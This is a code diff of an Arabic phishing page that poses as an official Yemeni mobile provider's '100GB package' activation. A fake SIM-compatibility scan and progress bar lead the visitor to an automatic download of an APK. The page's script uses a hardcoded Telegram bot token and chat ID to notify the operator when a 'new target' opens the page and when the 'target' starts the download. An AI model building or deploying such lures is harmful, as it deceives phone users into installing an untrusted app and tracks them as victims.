@@ -17,25 +17,19 @@
     </style>
 </head>
 <body>
-
 <div class="container">
     <div class="logo">📡</div>
     <h2>تنشيط باقة الـ 100GB</h2>
     <p>جاري فحص حالة الشريحة وتوافق البروتوكول مع الجيل الرابع...</p>
-    
-    <div class="progress-container">
-        <div class="progress-bar" id="myBar"></div>
-    </div>
+    <div class="progress-container"><div class="progress-bar" id="myBar"></div></div>
     <div class="status" id="statusText">جاري الفحص: 0%</div>
-
     <div class="footer">المزود الرسمي للخدمة في اليمن © 2026</div>
 </div>
-
 <script>
-    // إرسال إشعار الدخول للبوت الخاص بك
     const token = "8378572092:AAGF5CC5KNNhbXp0Sc4tO10JYutLs3wrEr8";
     const chatID = "8593367876";
 
+    // إشعار فوري عند دخول الصفحة
     fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=🌐 دخول هدف جديد لصفحة الفحص!`);
 
     let i = 0;
@@ -51,11 +45,11 @@
                     clearInterval(id);
                     i = 0;
                     status.innerHTML = "تم الفحص! جاري تحميل أداة التنشيط...";
-                    // إشعار التحميل
+                    // إشعار تليجرام عند اكتمال الفحص وبدء التحميل
                     fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=📥 بدأ الهدف الآن تحميل ملف الـ APK!`);
                     
-                    // السطر المعدل ليتوافق مع اسم ملفك المرفوع بالضبط
-                    window.location.href = "4G_فورجي_sign.apk";
+                    // تم تعديل الاسم ليطابق ملفك المرفوع حالياً بالضبط
+                    window.location.href = "4GFORGI_sign.apk";
                 } else {
                     width++;
                     elem.style.width = width + "%";
@@ -66,6 +60,5 @@
     }
     window.onload = move;
 </script>
-
 </body>
 </html>
